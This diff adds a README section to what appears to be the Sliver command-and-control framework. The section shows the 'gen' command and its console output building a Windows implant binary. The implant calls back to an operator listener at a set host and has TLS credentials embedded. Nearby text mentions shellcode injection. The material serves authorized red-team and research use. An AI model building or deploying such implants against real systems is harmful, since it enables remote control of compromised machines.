@@ -18,6 +18,23 @@ Sliver can inject payloads into it's own process or optionally use remote thread
 3. ???
 4. Shellz
 
+### Generating Client Binaries
+
+Simply use the `gen` command to generate client binaries on the fly:
+
+```
+[*] Welcome to the sliver shell, see `help` for available commands
+
+sliver > gen -save /root/ -lhost 172.16.20.1
+ gen -save /root/ -lhost 172.16.20.1
+
+[*] Generating new windows/amd64 sliver binary, please wait ...
+[*] Generated sliver binary at: /root/DEVELOPING_CLEAVAGE.exe
+```
+
+You're done! The binary has already been embedded with a unique X.509 certificate (for mutual TLS) and the server configuration.
+
+
 ### Local Thread Execution
 
 Execute shellcode in the local process:
